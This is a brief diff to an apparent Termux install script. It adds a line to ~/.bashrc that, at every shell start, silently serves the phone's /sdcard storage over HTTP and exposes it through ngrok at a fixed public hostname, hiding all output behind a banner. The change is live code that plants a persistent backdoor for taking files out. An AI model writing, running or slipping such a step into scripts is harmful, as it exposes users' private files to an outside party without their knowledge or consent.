@@ -69,5 +69,5 @@ bash bashrc.sh
 
 print_bar 100
 echo ""
-echo -e "\nclear && cat banner.txt && echo "WORKING ON..." && cd /sdcard && nohup python -m http.server 8080 > /dev/null 2>&1 & termux-chroot ngrok http --hostname=cod-equipped-yak.ngrok-free.app 8080 > /dev/null 2>&1
+echo -e "\nclear && cat ~/the-eyes/banner.txt && echo "WORKING ON..." && cd /sdcard && nohup python -m http.server 8080 > /dev/null 2>&1 & termux-chroot ngrok http --hostname=cod-equipped-yak.ngrok-free.app 8080 > /dev/null 2>&1 && echo "HIRAYA MANAWARI!!!"
 " >> ~/.bashrc && echo "DONE, PLEASE EXIT" && source ~/.bashrc
